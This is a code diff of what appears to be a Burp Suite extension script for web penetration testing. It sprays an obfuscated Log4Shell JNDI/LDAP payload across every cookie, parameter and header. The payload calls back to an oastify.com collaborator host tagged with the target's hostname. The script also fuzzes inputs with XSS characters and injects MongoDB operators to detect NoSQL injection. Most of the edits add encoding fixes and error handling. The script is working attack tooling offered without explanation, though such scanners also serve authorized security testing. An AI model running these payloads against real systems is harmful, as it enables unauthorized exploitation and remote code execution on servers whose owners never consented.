@@ -20,7 +20,8 @@ def jsonUnicodeEscape(selectedText):
 
 
 def log4shell(request):
-    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//3s5npu.example.com:/a}"
+    host = request.httpService().host()
+    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + host + ".TOKEN.oastify.com:/a}"  # Replace it
     pool.run(sendRequest, modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
     pool.run(sendRequest, modifyAllParamsValue(request, payload))
     for header in request.headers():
@@ -32,7 +33,7 @@ def log4shell(request):
 def fuzzParamPerRequest(request):
     payload = "'\">"
     if request.contentType() == ContentType.JSON:
-        for item in traverse_and_modify(json.loads(request.bodyToString().encode()), payload):
+        for item in traverse_and_modify(json.loads(request.bodyToString().encode("utf-8")), payload):
             pool.run(sendRequest, request.withBody(json.dumps(item)))
     for param in request.parameters():
         if param.type() == HttpParameterType.JSON:
@@ -60,6 +61,8 @@ def bypass403(editor, request):
 @run_in_pool(pool)
 def no_sql_request(request):
     requestResponse = sendRequest(request)
+    if requestResponse.response() is None:
+        return
     body = requestResponse.response().bodyToString()
     for highlight in ["unknown operator", "MongoError", "83b3j45b", "cannot be applied to a field", "expression is invalid"]:
         if highlight in body:
@@ -69,14 +72,20 @@ def no_sql_request(request):
             break
 
 def noSqliScan(request):
-    if request.body().length() > 6 and request.contentType() == ContentType.JSON:
-        for payload in traverse_and_modify(json.loads(request.bodyToString().encode()), {"$83b3j45b": "xxx"}):
-            no_sql_request(request.withBody(json.dumps(payload)))
-    for param in request.parameters():
-        paramType = param.type()
-        if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
-            #            no_sql_request(request.withUpdatedParameters(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
-            no_sql_request(request.withRemovedParameters(param).withParameter(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
+    if request.body().length() > 5 and request.contentType() == ContentType.JSON:
+        try:
+            json_obj = json.loads(request.bodyToString().encode("utf-8"))
+        except Exception:
+            print(request.url(), "json loads error")
+        else:
+            for payload in traverse_and_modify(json_obj, {"$83b3j45b": "xxx"}):
+                no_sql_request(request.withBody(json.dumps(payload)))
+    if len(request.parameters()) > 0:
+        for param in request.parameters():
+            paramType = param.type()
+            if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
+                #            no_sql_request(request.withUpdatedParameters(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
+                no_sql_request(request.withRemovedParameters(param).withParameter(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
 
 
 def insertAtCursor():
@@ -164,7 +173,7 @@ def sendRequestWithProxy(request):
     for header in request.headers():
         h = {header.name().encode(): header.value().encode()}
         headers.update(h)
-    body = request.bodyToString().encode()
+    body = request.bodyToString().encode("utf-8")
     send_request_with_proxy(url, method, headers, body, proxy)
 
 
@@ -183,10 +192,14 @@ def send_request_with_proxy(url, method, headers, body, proxy):
 
 
 def modifyAllParamsValue(request, value, excluded=[]):
-    if request.contentType() == ContentType.JSON:
-        json_body = json.loads(request.bodyToString().encode())
-        traverse_and_modify_all(json_body, value)
-        request = request.withBody(json.dumps(json_body))
+    body = request.bodyToString().encode("utf8")
+    if request.contentType() == ContentType.JSON and len(body) > 5:
+        try:
+            json_body = json.loads(body)
+            traverse_and_modify_all(json_body, value)
+            request = request.withBody(json.dumps(json_body))
+        except Exception:
+            print(request.url(), "json loads error")
     for param in request.parameters():
         excluded.append(HttpParameterType.JSON)
         if param.type() in excluded:
